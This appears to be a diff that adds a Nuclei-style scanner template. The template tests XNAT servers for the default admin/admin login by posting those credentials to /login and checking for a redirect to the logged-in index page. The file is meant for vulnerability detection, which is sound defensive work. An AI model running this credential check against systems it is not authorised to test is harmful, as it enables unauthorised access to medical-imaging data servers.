@@ -1,0 +1,45 @@
+id: xnat-default-login
+
+info:
+  name: XNAT Default Login
+  author: 0x_Akoko
+  severity: high
+  description: XNAT default login information (admin/admin) was discovered.
+  classification:
+    cwe-id: CWE-798
+  tags: xnat,default-login
+
+requests:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/app/template/Login.vm
+
+        login_method=localdb&username={{username}}&password={{password}}&login=&XNAT_CSRF=
+
+    cookie-reuse: true
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+
+      - type: word
+        part: location
+        words:
+          - "app/template/Index.vm?login=true"
